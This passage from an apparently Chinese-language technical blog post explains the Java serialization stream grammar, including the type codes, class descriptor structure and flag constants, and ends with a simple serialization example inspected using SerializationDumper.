title="object"></a>object</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">object:</span><br><span class="line">  newObject</span><br><span class="line">  newClass</span><br><span class="line">  newArray</span><br><span class="line">  newString</span><br><span class="line">  newEnum</span><br><span class="line">  newClassDesc</span><br><span class="line">  prevObject</span><br><span class="line">  nullReference</span><br><span class="line">  exception</span><br><span class="line">  TC_RESET</span><br></pre></td></tr></table></figure><p>对象序列化流中的”对象”与Java中的对象概念有些不一样。对象序列化流中的”对象”分为上面那些种，最常见的是newObject、newString、newClassDesc。</p><ul><li><p>newClassDesc表示ObjectStreamClass类的对象，可以简单理解为类的描述符。</p></li><li><p>newClass表示Class类对象，如person.class对象，就是Class类的一个实例对象。</p></li><li><p>newObject表示一个普通的对象，如果一个对象不是其他几种类型的对象（如newString、newClassDesc、newClass等），就归到newObject，如person对象。</p></li></ul><p>接下来也是按照这个顺序解析：</p><h3 id="newClassDesc"><a href="#newClassDesc" class="headerlink" title="newClassDesc"></a>newClassDesc</h3><p>表示是一个类描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newClassDesc:</span><br><span class="line">  TC_CLASSDESC className serialVersionUID newHandle classDescInfo</span><br><span class="line">  TC_PROXYCLASSDESC newHandle proxyClassDescInfo</span><br></pre></td></tr></table></figure><p>这里列出来了两种类描述符种类：</p><ul><li><p>一般正常的类描述符（主流）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TC_CLASSDESC className serialVersionUID newHandle classDescInfo</span><br></pre></td></tr></table></figure><p>TC_CLASSDESC：类描述符的开始标志</p><p>className：类名</p><p>serialVersionUID：序列化ID</p><p>newHandleL：新的引用</p><p>classDescInfo：类信息</p></li><li><p>动态代理类的类描述符</p></li></ul><h3 id="newObject"><a href="#newObject" class="headerlink" title="newObject"></a>newObject</h3><p>表示该部分是一个新的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newObject:</span><br><span class="line">  TC_OBJECT classDesc newHandle classdata[]  <span class="comment">// data for each class</span></span><br></pre></td></tr></table></figure><p>TC_OBJECT：常量，表示接下来是一个一个序列化Object的开始标志。</p><p>classDesc：当前这个对象的类描述符，里面存放的是类信息，字段信息。</p><p>newHandle：当前这个对象的引用句柄。</p><p>classData[]：这个对象对应的每一个Class的相关数据信息。这部分在下面会详细说</p><h3 id="newClass"><a href="#newClass" class="headerlink" title="newClass"></a>newClass</h3><p>表示该部分是一个新的Class类型的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newClass:</span><br><span class="line">  TC_CLASS classDesc newHandle</span><br></pre></td></tr></table></figure><p>TC_CLASS：类型标记，表示接下来是一个序列化Class类型的对象。</p><p>classDesc：表示这个Class对象的类描述符。</p><p>newHandle： 新的引用。</p><h3 id="classDesc"><a href="#classDesc" class="headerlink" title="classDesc"></a>classDesc</h3><p>表示一个对象的类描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">classDesc:</span><br><span class="line">  newClassDesc</span><br><span class="line">  nullReference</span><br><span class="line">  (ClassDesc)prevObject      <span class="comment">// an object required to be of type</span></span><br><span class="line">                             <span class="comment">// ClassDesc</span></span><br></pre></td></tr></table></figure><p>newClassDesc：对象的类描述符</p><p>nullReference：空引用</p><p>(ClassDesc)prevObject ：表示前面出现过的对象（<em>要求为ClassDesc类型的对象</em>）</p><h3 id="superClassDesc"><a href="#superClassDesc" class="headerlink" title="superClassDesc"></a>superClassDesc</h3><p>表示父类的描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">superClassDesc:</span><br><span class="line">  classDesc</span><br></pre></td></tr></table></figure><p>如果被序列化对象的类，如果其父类没有实现Serializable接口，这个地方就是TC_NULL，表示空对象。</p><p>如果其父类实现了实现了Serializable接口，那此处会写入其父类对应的ObjectStreamClass对象，父类描述符。</p><h3 id="classDescInfo"><a href="#classDescInfo" class="headerlink" title="classDescInfo"></a>classDescInfo</h3><p>表示是详细的类描述信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classDescInfo:</span><br><span class="line">  classDescFlags fields classAnnotation superClassDesc</span><br></pre></td></tr></table></figure><p>classDescFlags：类描述信息标记</p><p>fields ：类中所有字段的描述信息</p><p>classAnnotation ：和类相关的Annotation的描述信息</p><p>superClassDesc：该类的父类的描述信息</p><h3 id="proxyInterface"><a href="#proxyInterface" class="headerlink" title="proxyInterface"></a>proxyInterface</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxyInterfaceName:</span><br><span class="line">  (utf)</span><br></pre></td></tr></table></figure><p>动态代理类的代理接口的名称，一个UTF-8格式的字符串对应的二进制序列；</p><h3 id="proxyClassDescInfo"><a href="#proxyClassDescInfo" class="headerlink" title="proxyClassDescInfo"></a>proxyClassDescInfo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxyClassDescInfo:</span><br><span class="line">  (<span class="keyword">int</span>)&lt;count&gt; proxyInterfaceName[count] classAnnotation</span><br><span class="line">      superClassDesc</span><br></pre></td></tr></table></figure><p>动态代理类的相关描述信息</p><p><code>&lt;count&gt;</code>表示该动态代理类实现的接口总数，类型为int类型</p><p>proxyInterfaceName[count]表示所有当前动态代理类实现的接口信息</p><p>classAnnotation表示该动态代理类对应的Annotation的描述信息</p><p>superClassDesc表示当前动态代理类的父类的类描述信息</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields"></a>fields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fields:</span><br><span class="line">  (<span class="keyword">short</span>)&lt;count&gt;  fieldDesc[count]</span><br></pre></td></tr></table></figure><p><code>&lt;count&gt;</code>表示该类中fields总数，数据类型为<code>short</code>类型。</p><p><code>fieldDesc[count]</code>表示一个类中所有字段的详细描述信息，字段的数量和前边的count是一致的；</p><h3 id="fieldDesc"><a href="#fieldDesc" class="headerlink" title="fieldDesc"></a>fieldDesc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fieldDesc:</span><br><span class="line">  primitiveDesc</span><br><span class="line">  objectDesc</span><br></pre></td></tr></table></figure><p>表示fields描述信息</p><p>两部分：</p><ul><li>primitiveDesc ： 基础类型数据的描述符</li><li>objectDesc ：对象数据类型的描述信息</li></ul><h3 id="primitiveDesc"><a href="#primitiveDesc" class="headerlink" title="primitiveDesc"></a>primitiveDesc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">primitiveDesc:</span><br><span class="line">  prim_typecode fieldName</span><br></pre></td></tr></table></figure><p>表示8种基础类型的字段的相关描述信息。</p><p>prim_typecode ：基本类型字段的类型 如下</p><p>fieldName ： 字段名字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`B`       <span class="comment">// byte</span></span><br><span class="line">`C`       <span class="comment">// char</span></span><br><span class="line">`D`       <span class="comment">// double</span></span><br><span class="line">`F`       <span class="comment">// float</span></span><br><span class="line">`I`       <span class="comment">// integer</span></span><br><span class="line">`J`       <span class="comment">// long</span></span><br><span class="line">`S`       <span class="comment">// short</span></span><br><span class="line">`Z`       <span class="comment">// boolean</span></span><br></pre></td></tr></table></figure><h3 id="objectDesc"><a href="#objectDesc" class="headerlink" title="objectDesc"></a>objectDesc</h3><p> 对象类型的field的描述信息。</p><p>对象类型字段 = 该成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objectDesc:</span><br><span class="line">  obj_typecode fieldName className1</span><br></pre></td></tr></table></figure><p>obj_typecode ：该成员的类型 如下</p><p>fieldName：该成员的名字</p><p>className1：该对象的类全名，String，<em>// 包含字段类型的字符串，字段描述符格式</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`[`       <span class="comment">// array</span></span><br><span class="line">`L`       <span class="comment">// object</span></span><br></pre></td></tr></table></figure><h3 id="classAnnotation"><a href="#classAnnotation" class="headerlink" title="classAnnotation"></a>classAnnotation</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">classAnnotation:</span><br><span class="line">  endBlockData</span><br><span class="line">  contents endBlockData      <span class="comment">// contents written by annotateClass</span></span><br></pre></td></tr></table></figure><p>该对象所属类中的<code>Annotation</code>的描述信息</p><p>endBlockData : 终止符 意味着存储对象的数据块[Data-Block]的结束</p><p>contents endBlockData：该类中多个content的终止</p><p>这里多说一点：</p><p>classAnotation是由ObjectOutputStream的annotateClass()方法写入的。</p><p>由于annotateClass()方法默认什么都不做。所以classAnnotations一般都是TC_ENDBLOCKDATA。</p><h3 id="newArray"><a href="#newArray" class="headerlink" title="newArray"></a>newArray</h3><p>一个新的数组的描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newArray:</span><br><span class="line">  <span class="function">TC_ARRAY classDesc <span class="title">newHandle</span> <span class="params">(<span class="keyword">int</span>)</span>&lt;size&gt; values[size]</span></span><br></pre></td></tr></table></figure><p>TC_ARRAY ：表示新的数组类型的序列化对象的开始</p><p>classDesc：这个数组的类描述符号</p><p>newHandle：针对当前数组对象的引用</p><p><code>(int)&lt;size&gt;</code>：该数组的长度，长度为int类型</p><p>values[size]：表示当前数组每一个元素值部分的内容</p><h3 id="newString"><a href="#newString" class="headerlink" title="newString"></a>newString</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newString:</span><br><span class="line">  <span class="function">TC_STRING <span class="title">newHandle</span> <span class="params">(utf)</span></span></span><br><span class="line"><span class="function">  TC_LONGSTRING <span class="title">newHandle</span> <span class="params">(<span class="keyword">long</span>-utf)</span></span></span><br></pre></td></tr></table></figure><p>表示一个字符串类型的对象</p><p>两种类型：<code>STRING</code>  <code>LONGSTRING</code></p><h3 id="newEnum"><a href="#newEnum" class="headerlink" title="newEnum"></a>newEnum</h3><p>表示一个枚举类型的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newEnum:</span><br><span class="line">  TC_ENUM classDesc newHandle enumConstantName</span><br></pre></td></tr></table></figure><p><code>TC_ENUM</code>为枚举类型的标识，表示接下来的序列类型是枚举类型</p><p><code>classDesc</code>为一个枚举类型的类描述符</p><p><code>newHandle</code>为该枚举对象的引用</p><p><code>enumConstantName</code>的值为调用枚举类型中的<code>name()</code>方法返回的枚举类型的值对应的字符串字面量</p><h3 id="enumConstantName"><a href="#enumConstantName" class="headerlink" title="enumConstantName"></a>enumConstantName</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enumConstantName:</span><br><span class="line">  (String)object</span><br></pre></td></tr></table></figure><p> 枚举常量的字符串名称字面量，本身为一个字符串。</p><h3 id="prevObject"><a href="#prevObject" class="headerlink" title="prevObject"></a>prevObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prevObject</span><br><span class="line">  TC_REFERENCE (<span class="keyword">int</span>)handle</span><br></pre></td></tr></table></figure><p>表示前一个对象，handle表示是前一个对象的引用。</p><h3 id="nullReference"><a href="#nullReference" class="headerlink" title="nullReference"></a>nullReference</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nullReference</span><br><span class="line">  TC_NULL</span><br></pre></td></tr></table></figure><p>表示null，一般这个值表示空引用。</p><h3 id="exception"><a href="#exception" class="headerlink" title="exception"></a>exception</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exception:</span><br><span class="line">  <span class="function">TC_EXCEPTION <span class="title">reset</span> <span class="params">(Throwable)</span>object         reset</span></span><br></pre></td></tr></table></figure><p>表示异常</p><p>TC_EXCEPTION ： 异常信息的标识符</p><h3 id="blockdata"><a href="#blockdata" class="headerlink" title="blockdata"></a>blockdata</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blockdata:</span><br><span class="line">  blockdatashort</span><br><span class="line">  blockdatalong</span><br></pre></td></tr></table></figure><p>在Java序列化中，数据块存储分为<strong>两</strong>种:</p><p>一种是长度为short的默认数据块方式</p><p>另外一种是长度为int的数据块方式，这种方式可存储容量大的数据；</p><p>如果我们只是往流中写入的是基本数据类型的数据，比如整数、浮点数，会在流中使用<code>blockdata</code>进行标记。</p><h3 id="endBlockData"><a href="#endBlockData" class="headerlink" title="endBlockData"></a>endBlockData</h3><p>Data-Block结束的标记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blockdatashort:</span><br><span class="line">  TC_BLOCKDATA (unsigned <span class="keyword">byte</span>)&lt;size&gt; (<span class="keyword">byte</span>)[size]</span><br><span class="line"></span><br><span class="line">blockdatalong:</span><br><span class="line">  TC_BLOCKDATALONG (<span class="keyword">int</span>)&lt;size&gt; (<span class="keyword">byte</span>)[size]</span><br><span class="line"></span><br><span class="line">endBlockData   :</span><br><span class="line">  TC_ENDBLOCKDATA</span><br></pre></td></tr></table></figure><h3 id="classdata"><a href="#classdata" class="headerlink" title="classdata[]"></a>classdata[]</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">classdata:</span></span><br><span class="line">  nowrclass                 <span class="comment">// SC_SERIALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// !(SC_WRITE_METHOD &amp; classDescFlags)</span></span><br><span class="line">  wrclass objectAnnotation  <span class="comment">// SC_SERIALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// SC_WRITE_METHOD &amp; classDescFlags</span></span><br><span class="line">  externalContents          <span class="comment">// SC_EXTERNALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// !(SC_BLOCKDATA  &amp; classDescFlags</span></span><br><span class="line">  objectAnnotation          <span class="comment">// SC_EXTERNALIZABLE &amp; classDescFlag&amp;&amp; </span></span><br><span class="line">                            <span class="comment">// SC_BLOCKDATA &amp; classDescFlags</span></span><br></pre></td></tr></table></figure><h3 id="nowrclass"><a href="#nowrclass" class="headerlink" title="nowrclass"></a>nowrclass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nowrclass:</span><br><span class="line">  values                    <span class="comment">// 类描述符顺序的字段</span></span><br></pre></td></tr></table></figure><p>一个类中可序列化的字段的数据值，这些数据值的顺序遵循类描述符中定义的顺序；</p><h3 id="wrclass"><a href="#wrclass" class="headerlink" title="wrclass"></a>wrclass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wrclass:</span><br><span class="line">  nowrclass</span><br></pre></td></tr></table></figure><p>这部分数据的内容和上述的nowrclass部分的内容是一样的，表一个类中可序列化的字段的数据值；</p><h3 id="externalContents"><a href="#externalContents" class="headerlink" title="externalContents"></a>externalContents</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externalContents:         <span class="comment">// externalContent written by </span></span><br><span class="line">  externalContent         <span class="comment">// writeExternal in PROTOCOL_VERSION_1.</span></span><br><span class="line">  externalContents externalContent</span><br></pre></td></tr></table></figure><p>在<code>PROTOCOL_VERSION_1</code>中由<code>writeExternal</code>编写的外部内容。</p><p>这部分内容是上述的external内容的一个集合，一般这一部分<strong>只包含</strong>了使用<code>writeExternal</code>方法以<code>PROTOCOL_VERSION_1</code>的版本写入字节流的数据；</p><h3 id="externalContent"><a href="#externalContent" class="headerlink" title="externalContent"></a>externalContent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externalContent:          <span class="comment">// Only parseable by readExternal</span></span><br><span class="line">  ( bytes)                <span class="comment">// primitive data 基础数据 8种</span></span><br><span class="line">    object</span><br></pre></td></tr></table></figure><p>这部分描述的是external的相关内容</p><p><code>(bytes)</code>部分的数据只能被<code>readExternal</code>方法读取，而且里面一般包含的数据类型是基础类型数据，<code>object</code>表示对象数据类型；</p><h3 id="objectAnnotation"><a href="#objectAnnotation" class="headerlink" title="objectAnnotation"></a>objectAnnotation</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">objectAnnotation:</span><br><span class="line">  endBlockData</span><br><span class="line">  contents endBlockData     <span class="comment">// contents written by writeObject</span></span><br><span class="line">                            <span class="comment">// or writeExternal PROTOCOL_VERSION_2.</span></span><br></pre></td></tr></table></figure><p>这部分数据的内容和<code>classAnnotation</code>的数据结构是一致的；</p><p>表示该对象所属类中的<code>Annotation</code>的描述信息，<code>endBlockData</code>为存储对象的数据块【<code>Data-Block</code>】的<strong>结束标记</strong>，为终止符，<code>contents</code>表示该类中多个内容的一个集合【contents】；</p><h2 id="values"><a href="#values" class="headerlink" title="values"></a>values</h2><p>针对当前对象的<code>classDesc</code>对应的类描述信息提供描述类型的大小和类型；</p><blockquote><p>The size and types are described by the classDesc for the current object</p></blockquote><h2 id="newHandle"><a href="#newHandle" class="headerlink" title="newHandle"></a>newHandle</h2><p>序列中的下一个数值将赋值给一个可序列化或者可执行反序列化的对象引用；</p><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><p>一个已知对象的集合将会<strong>被放弃</strong>，重置该字节流；</p><blockquote><p>// The set of known objects is discarded so the objects of the exception do not overlap with the previously sent objects or with objects that may be sent after the exception</p></blockquote><h1 id="终端常量标识符"><a href="#终端常量标识符" class="headerlink" title="终端常量标识符"></a>终端常量标识符</h1><p>在<code>java.io.ObjectStreamConstants</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">short</span> STREAM_MAGIC = (<span class="keyword">short</span>)<span class="number">0xaced</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">short</span> STREAM_VERSION = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_NULL = (<span class="keyword">byte</span>)<span class="number">0x70</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_REFERENCE = (<span class="keyword">byte</span>)<span class="number">0x71</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_CLASSDESC = (<span class="keyword">byte</span>)<span class="number">0x72</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_OBJECT = (<span class="keyword">byte</span>)<span class="number">0x73</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_STRING = (<span class="keyword">byte</span>)<span class="number">0x74</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ARRAY = (<span class="keyword">byte</span>)<span class="number">0x75</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_CLASS = (<span class="keyword">byte</span>)<span class="number">0x76</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_BLOCKDATA = (<span class="keyword">byte</span>)<span class="number">0x77</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ENDBLOCKDATA = (<span class="keyword">byte</span>)<span class="number">0x78</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_RESET = (<span class="keyword">byte</span>)<span class="number">0x79</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_BLOCKDATALONG = (<span class="keyword">byte</span>)<span class="number">0x7A</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_EXCEPTION = (<span class="keyword">byte</span>)<span class="number">0x7B</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_LONGSTRING = (<span class="keyword">byte</span>) <span class="number">0x7C</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_PROXYCLASSDESC = (<span class="keyword">byte</span>) <span class="number">0x7D</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ENUM = (<span class="keyword">byte</span>) <span class="number">0x7E</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span>  <span class="keyword">int</span>   baseWireHandle = <span class="number">0x7E0000</span>;</span><br></pre></td></tr></table></figure><p><code>classDescFlags</code>会用到的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_WRITE_METHOD = <span class="number">0x01</span>; <span class="comment">//if SC_SERIALIZABLE</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_BLOCK_DATA = <span class="number">0x08</span>;    <span class="comment">//if SC_EXTERNALIZABLE</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_SERIALIZABLE = <span class="number">0x02</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_EXTERNALIZABLE = <span class="number">0x04</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_ENUM = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>协议还说的一段话，暂时看不懂，先写上：</p><blockquote><p> The flag <em>SC_WRITE_METHOD</em> is set if the Serializable class writing the stream had a <code>writeObject</code> method that may have written additional data to the stream. In this case a <em>TC_ENDBLOCKDATA</em> marker is always expected to terminate the data for that class.</p></blockquote><blockquote><p> The flag <em>SC_BLOCKDATA</em> is set if the <code>Externalizable</code> class is written into the stream using <code>STREAM_PROTOCOL_2</code>. By default, this is the protocol used to write <code>Externalizable</code> objects into the stream in JDK 1.2. JDK 1.1 writes <em>STREAM_PROTOCOL_1</em>.</p></blockquote><blockquote><p>The flag <em>SC_SERIALIZABLE</em> is set if the class that wrote the stream extended <code>java.io.Serializable</code> but not <code>java.io.Externalizable</code>, the class reading the stream must also extend <code>java.io.Serializable</code> and the default serialization mechanism is to be used.</p></blockquote><blockquote><p> The flag <em>SC_EXTERNALIZABLE</em> is set if the class that wrote the stream extended <code>java.io.Externalizable</code>, the class reading the data must also extend <code>Externalizable</code> and the data will be read using its <code>writeExternal</code> and <code>readExternal</code> methods.</p></blockquote><blockquote><p> The flag <em>SC_ENUM</em> is set if the class that wrote the stream was an enum type. The receiver’s corresponding class must also be an enum type. Data for constants of the enum type will be written and read as described in <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html#a6469" target="_blank" rel="noopener">Section 1.12, “Serialization of Enum Constants</a>“.</p></blockquote><p>如果写入流的可序列化类具有<code>writeObject</code>方法，并且若该方法已将其他数据写入 stream ，则会设置标志<code>SC_WRITE_METHOD</code>。在这种情况下，<code>TC_ENDBLOCKDATA</code>标记总是希望终止该类的数据。</p><p>如果使用<code>SC_BLOCKDATA</code>将<code>Externalizable</code>类写入 stream，则设置标志<code>SC_BLOCKDATA</code>。默认情况下，在<code>JDK 1.2</code>中将<code>Externalizable</code>对象写入stream的协议。<code>JDK1.1</code>中写入<code>STREAM_PROTOCOL_1</code></p><p>如果编写 stream 的类扩展了<code>java.io.SERIALIZABLE</code>而不是<code>java.io.Externalizable</code>，那么会设置标志 <code>SC_SERIALIZABLE</code>，读取 stream 的类也必须扩展<code>java.io.SERIALIZABLE</code>，并使用默认的序列化机制。</p><p>如果编写 stream 扩展<code>java.io.EXTERNALIZABLE</code>的类，读取数据的类也必须扩展<code>EXTERNALIZABLE</code>，并且如果使用其<code>writeExternal</code>和<code>readExternal</code>方法读取数据，那么会设置标记<code>SC_EXTERNALIZABLE</code>。</p><p>如果写入 stream 的类是枚举类型，则会设置标志<code>SC_ENUM</code>。接收方的对应类也必须是枚举类型。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>这里写一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"0range"</span>, <span class="number">100</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"0rangetest.ser"</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接上<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>看结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar SerializationDumper.jar  -r test.ser</span><br></pre></td></tr></table></figure><p><img 